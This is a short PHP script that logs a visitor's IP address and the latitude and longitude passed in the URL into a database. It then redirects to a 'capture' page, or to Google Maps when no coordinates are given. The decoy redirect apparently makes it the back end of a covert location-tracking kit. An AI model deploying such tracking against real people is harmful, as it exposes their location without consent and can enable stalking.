<?php
include_once "config.php";
date_default_timezone_set('America/Lima');
$time = date("Y-m-d H:i:s");
//Obtener dirección ip del usuario
function getIP()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ip = getIP();

if (isset($_GET['lat']) && isset($_GET['lng'])) {
    $lat = $_GET['lat'];
    $lng = $_GET['lng'];

    //insert a la base de datos
    $sql = $mysql->prepare("INSERT INTO geolocation (address,lat,lng, timedate) VALUES (?, ?, ?, ?)");
    $sql->execute(array($ip, $lat, $lng, $time));
    if ($sql) {
        echo "<script>window.location.href = 'capture';</script>";
    }
} else {
    echo "<script>window.location.href = 'https://www.google.com/maps/';</script>";
}
